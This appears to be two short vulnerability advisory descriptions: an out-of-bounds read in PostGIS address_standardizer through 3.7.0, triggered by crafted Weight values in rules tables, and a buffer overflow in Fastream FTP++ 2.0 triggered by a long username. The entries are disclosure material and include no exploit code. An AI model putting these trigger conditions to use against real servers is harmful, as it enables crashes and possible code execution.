PostGIS address_standardizer through 3.7.0 fails to validate the Weight parameter from caller-supplied rules tables before using it as an array index. Attackers can craft malicious rule rows with out-of-range Weight values to trigger out-of-bounds reads in the load_value array, causing the PostgreSQL backend process to crash and terminate all cluster sessions.
Buffer overflow in Fastream FTP++ 2.0 allows remote attackers to cause a denial of service and possibly execute arbitrary commands via a long username.
